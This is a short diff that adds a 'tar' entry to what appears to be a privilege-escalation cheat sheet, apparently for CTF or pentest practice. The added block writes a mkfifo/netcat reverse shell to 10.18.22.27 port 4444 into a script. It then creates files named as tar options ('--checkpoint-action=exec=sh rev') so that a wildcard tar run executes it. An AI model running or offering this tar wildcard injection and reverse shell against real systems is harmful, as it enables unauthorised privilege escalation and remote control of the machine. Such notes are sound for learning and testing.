@@ -96,6 +96,20 @@ export PATH=/tmp:$PATH
 
 </details>
 
+<details><summary>tar</summary>
+
+```
+cat > /home/andre/backup/rev << EOF
+#!/bin/bash
+rm /tmp/f
+mkfifo /tmp/f
+cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
+EOF
+echo "" > "/home/andre/backup/--checkpoint=1"
+echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
+chmod +x rev
+```
+
 #### information gathering
 ```bash
 cat /proc/version
